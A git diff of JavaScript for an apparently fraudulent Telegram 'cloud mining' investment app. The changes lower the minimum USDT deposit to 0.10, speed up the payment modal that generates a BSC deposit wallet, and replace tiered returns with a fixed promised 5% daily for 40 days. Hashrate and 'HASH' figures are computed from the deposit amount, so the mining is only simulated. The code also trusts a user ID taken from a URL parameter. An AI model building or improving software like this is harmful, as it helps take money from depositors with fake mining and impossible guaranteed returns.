@@ -15,7 +15,7 @@ export function startMiningEngine() {
         if (typeof state.addMiningTick === 'function') {
             state.addMiningTick();
         }
-        
+
         const displayHash = document.getElementById('mining-hash');
         if (displayHash && (state.totalInvestedUSDT > 0 || state.accumulatedMining > 0)) {
             const hash = parseFloat(state.accumulatedMining) || 0;
@@ -26,7 +26,7 @@ export function startMiningEngine() {
 }
 
 // ==========================================
-// 2. PASARELA DE PAGOS (INTERACCIÓN UI)
+// 2. PASARELA DE PAGOS (APERTURA ULTRA RÁPIDA)
 // ==========================================
 export async function openPayModal() {
     if (isGeneratingWallet) return;
@@ -34,18 +34,20 @@ export async function openPayModal() {
     const amountInput = document.getElementById('invest-amount');
     const amount = parseFloat(amountInput?.value || 0);
 
-    if (!amount || amount < 1) {
+    // Ajustado al nuevo mínimo global de 0.1 USDT
+    if (!amount || amount < 0.1) {
+        const errorMsg = "❌ El mínimo de inyección de liquidez es 0.10 USDT";
         if (window.Telegram?.WebApp) {
-            window.Telegram.WebApp.showAlert("❌ El mínimo de inyección de liquidez es 1.00 USDT");
+            window.Telegram.WebApp.showAlert(errorMsg);
         } else {
-            alert("❌ El mínimo de inyección de liquidez es 1.00 USDT");
+            alert(errorMsg);
         }
         return;
     }
 
     isGeneratingWallet = true;
 
-    // UI: Mostrar Modal en estado de carga
+    // --- OPTIMIZACIÓN DE VELOCIDAD: Apertura instantánea de la UI ---
     const payModal = document.getElementById('payModal');
     if (payModal) payModal.style.display = 'flex';
 
@@ -58,6 +60,7 @@ export async function openPayModal() {
     const qrImg = document.getElementById('qr-image');
     if (qrImg) qrImg.src = ''; 
 
+    // Los procesos pesados de red se ejecutan con el modal ya abierto en pantalla
     try {
         await notificarAlBot("intento_pago", amount);
         const data = await generarWalletBSC();
@@ -113,7 +116,7 @@ function startPaymentTimer(minutes) {
 
         let mins = Math.floor(seconds / 60).toString().padStart(2, '0');
         let secs = (seconds % 60).toString().padStart(2, '0');
-        
+
         const timerDisplay = document.getElementById('payment-countdown');
         if (timerDisplay) timerDisplay.innerText = `${mins}:${secs}`; 
         seconds--;
@@ -149,32 +152,27 @@ export function copyAddress() {
     }
 }
 
+// Sistema unificado: 5% diario fijo por 40 días, mínimo 0.1 USDT
 export function calculateROI() {
-    const amount = parseFloat(document.getElementById('invest-amount')?.value || 0);
+    const amountInput = document.getElementById('invest-amount');
     const calcPower = document.getElementById('calc-power');
     const calcHash = document.getElementById('calc-hash');
-    const calcTier = document.getElementById('calc-tier');
 
-    if(amount > 0) {
-        calcPower.innerHTML = `<i class="fa-solid fa-bolt" style="color: var(--blue-tg); width: 15px;"></i> ${(amount * 1000).toLocaleString()} GH/s`;
-        
-        // Simulación matemática del retorno según el tier
-        let dailyPercentage = 0.045; // Base 4.5%
-        let tierName = "MICRO-NODO";
-        let tierColor = "#3b82f6";
-        
-        if (amount >= 500) { dailyPercentage = 0.075; tierName = "GIGA-CLUSTER"; tierColor = "#f59e0b"; }
-        else if (amount >= 100) { dailyPercentage = 0.065; tierName = "MASTERNODE"; tierColor = "#a855f7"; }
-        else if (amount >= 50) { dailyPercentage = 0.055; tierName = "SERVER-NODE"; tierColor = "#10b981"; }
+    if (!amountInput) return;
+    const amount = parseFloat(amountInput.value) || 0;
 
-        const dailyHash = Math.floor(amount * dailyPercentage * 10000); 
+    if (amount >= 0.1) {
+        if (calcPower) calcPower.innerHTML = `<i class="fa-solid fa-bolt" style="color: var(--blue-tg); width: 15px;"></i> ${(amount * 1000).toLocaleString()} GH/s`;
 
-        calcHash.innerHTML = `<i class="fa-solid fa-cube" style="color: #10b981; width: 15px;"></i> ${dailyHash.toLocaleString()} HASH`;
-        calcTier.innerHTML = `<i class="fa-solid fa-shield-halved" style="color: ${tierColor}; width: 15px;"></i> <span style="color: ${tierColor}">${tierName}</span>`;
+        // 5% diario fijo
+        const dailyPercentage = 0.05; 
+        const dailyProfitUSDT = amount * dailyPercentage;
+        const dailyHash = Math.floor(dailyProfitUSDT * 1000); 
+
+        if (calcHash) calcHash.innerHTML = `<i class="fa-solid fa-cube" style="color: #10b981; width: 15px;"></i> ${dailyHash.toLocaleString()} HASH`;
     } else {
-        calcPower.innerHTML = `<i class="fa-solid fa-bolt" style="color: var(--blue-tg); width: 15px;"></i> 0.0 GH/s`;
-        calcHash.innerHTML = `<i class="fa-solid fa-cube" style="color: #10b981; width: 15px;"></i> 0 HASH`;
-        calcTier.innerHTML = `<i class="fa-solid fa-shield-halved" style="color: #f59e0b; width: 15px;"></i> ---`;
+        if (calcPower) calcPower.innerHTML = `<i class="fa-solid fa-bolt" style="color: var(--blue-tg); width: 15px;"></i> 0.0 GH/s`;
+        if (calcHash) calcHash.innerHTML = `<i class="fa-solid fa-cube" style="color: #10b981; width: 15px;"></i> 0 HASH`;
     }
 }
 
@@ -191,30 +189,25 @@ export function claimMining() {
 // ==========================================
 window.onload = () => {
     console.log("Iniciando protocolos del sistema...");
-    
-    // 1. Sincronizar con la API de Telegram
+
     if (window.Telegram?.WebApp) {
         window.Telegram.WebApp.ready();
         window.Telegram.WebApp.expand();
         window.Telegram.WebApp.setHeaderColor('#05070a'); 
     }
 
-    // 2. Extracción de datos del operador (Con retraso táctico para evitar errores de red)
     setTimeout(() => {
         try {
             const tgData = window.Telegram?.WebApp?.initDataUnsafe;
             const urlParams = new URLSearchParams(window.location.search);
 
-            // Rescate de ID: Telegram -> URL -> ID Simulado para pruebas en PC
             state.userId = tgData?.user?.id || urlParams.get('user_id') || '88888888';
 
             console.log(`[OK] Enlace establecido. Operador ID: ${state.userId}`);
 
-            // 3. Renderizar componentes de UI
             if (typeof updateDashboard === 'function') updateDashboard();
             if (typeof renderHistory === 'function') renderHistory();
-            
-            // 4. Encender el motor principal
+
             startMiningEngine();
 
         } catch (error) {
@@ -226,8 +219,6 @@ window.onload = () => {
 // ==========================================
 // 5. EXPORTAR AL ENTORNO GLOBAL
 // ==========================================
-// Esto es estrictamente necesario para que los botones de tu HTML (onclick="...") 
-// puedan encontrar estas funciones dentro del ecosistema de módulos de JavaScript.
 window.openPayModal = openPayModal;
 window.closePayModal = closePayModal;
 window.copyLink = copyLink;
